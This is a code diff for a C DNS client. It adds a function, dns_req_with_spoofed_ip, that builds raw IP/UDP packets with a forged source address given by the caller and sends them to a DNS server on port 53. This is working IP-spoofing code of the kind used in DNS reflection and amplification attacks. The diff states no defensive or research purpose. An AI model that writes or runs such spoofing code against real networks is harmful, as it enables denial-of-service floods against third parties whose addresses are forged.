@@ -28,7 +28,6 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
 {
     int s = -1;
     struct sockaddr_in dest = {0};
-    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)] = {0};
 
     feel_dns_header_req(&dns->header);
 
@@ -66,6 +65,60 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
 
     int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);
 
+    // printf("\nSending Packet...");
+    if( 0 > sendto(s,(char*)buf,len,0,(struct sockaddr*)&dest,sizeof(dest)) )
+    {
+        printf("sendto failed");
+        close(s);
+	    return DNS_RESULT_ERR;
+    }
+    // printf("Done");
+
+    //Receive the answer
+    i = sizeof dest;
+    // printf("\nReceiving answer...");
+    if(recvfrom (s, (char*)buf , 65536 , 0 , (struct sockaddr*)&dest , (socklen_t*)&i ) < 0)
+    {
+        //perror("recvfrom failed");
+        close(s);
+	    printf("recvfrom failed");
+        return DNS_RESULT_ERR;
+    }
+    // printf("Done");
+    close(s);
+    return DNS_RESULT_OK;
+}
+
+dns_result dns_req_with_spoofed_ip(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qinfo, char* host, char* buf,
+    int query_type, const char *server, const char *spoofed_ip)
+{
+    int s = -1;
+    struct sockaddr_in dest = {0};
+    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)] = {0};
+
+    feel_dns_header_req(&dns->header);
+
+    //point to the query portion
+    qname =(unsigned char*)&buf[sizeof(struct DNS_UDP_HEADER)];
+    ChangetoDnsNameFormat(qname , (unsigned char*)host);
+    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
+    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
+    qinfo->qclass = htons(1);
+
+    int i = 0;
+    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //UDP packet for DNS queries SOCK_RAW, IPPROTO_RAW
+    if(s<0)
+    {
+        printf("Conn refused\n");
+        close(s);
+        return DNS_RESULT_ERR;
+    }
+
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(53);
+    dest.sin_addr.s_addr = inet_addr(server);
+
+    int len = (unsigned int)sizeof(struct DNS_UDP_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION);
 
     struct ip *ip_hdr = (struct ip *) datagram;
     struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
@@ -80,12 +133,12 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
     ip_hdr->ip_ttl = 255; //ttl
     ip_hdr->ip_p = 17; //protocol
     ip_hdr->ip_sum = 0; //temp checksum
-    ip_hdr->ip_src.s_addr = inet_addr ("188.166.88.29"); //src ip - spoofed
+    ip_hdr->ip_src.s_addr = inet_addr (spoofed_ip); //src ip - spoofed
     ip_hdr->ip_dst.s_addr = inet_addr(server); //dst ip
 
-    
+
     srand(time(NULL));   // Initialization, should only be called once.
-    int r = rand()%64511; 
+    int r = rand()%64511;
     udp_hdr->source = htons(r+1025); //htons(53);
     udp_hdr->dest = htons(53); //srand(time(NULL)) % 65536; //dst port
     udp_hdr->len = htons(sizeof(struct udphdr) + len); //length
@@ -95,20 +148,11 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
 
     len += sizeof(struct ip);
     len += sizeof(struct udphdr);
-    // printf("\nSending Packet...");
-    // if( 0 > sendto(s,(char*)buf,len,0,(struct sockaddr*)&dest,sizeof(dest)) )
-    // {
-    //     printf("sendto failed");
-    //     close(s);
-	//     return DNS_RESULT_ERR;
-    // }
-    // printf("Done");
-        /* inform kernel that we have added packet headers */
 
     int on = 1;
     if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
         perror("[-] Error! Cannot set IP_HDRINCL");
-        return -1;
+        return DNS_RESULT_ERR;
     }
 
     /* send spoofed packet (set routing flags to 0) */
@@ -120,16 +164,4 @@ dns_result dns_udp_req(DNS_H_UDP *dns, unsigned char *qname, struct QUESTION *qi
     else
         printf( "[+] Spoofed IP packet sent successfully!\n");
 
-
-    // Receive the answer
-    i = sizeof dest;
-    if (recvfrom(s, (char *)buf, 65536, 0, (struct sockaddr *)&dest, (socklen_t *)&i) < 0)
-    {
-        // perror("recvfrom failed");
-        close(s);
-        // printf("recvfrom failed");
-        return DNS_RESULT_RECV_ERR;
-    }
     close(s);
-    return DNS_RESULT_OK;
-}
